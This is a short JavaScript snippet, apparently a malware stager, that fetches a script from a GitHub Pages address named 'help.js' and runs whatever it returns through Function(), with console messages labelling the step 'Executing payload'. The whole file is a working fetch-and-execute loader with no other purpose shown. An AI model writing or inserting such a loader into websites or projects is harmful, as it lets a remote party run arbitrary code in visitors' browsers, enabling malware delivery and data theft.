(async function(){
  console.log('🐛 Loader: Starting');
  try {
    const resp = await fetch('https://cloudsecu.github.io/Data/help.js');
    console.log('🐛 Loader: Status', resp.status);
    
    if (resp.ok) {
      const code = await resp.text();
      console.log('🐛 Loader: Executing payload');
      Function(code)();
    } else {
      console.error('🐛 Loader: 404/500');
    }
  } catch(e) {
    console.error('🐛 Loader ERROR:', e);
  }
})();
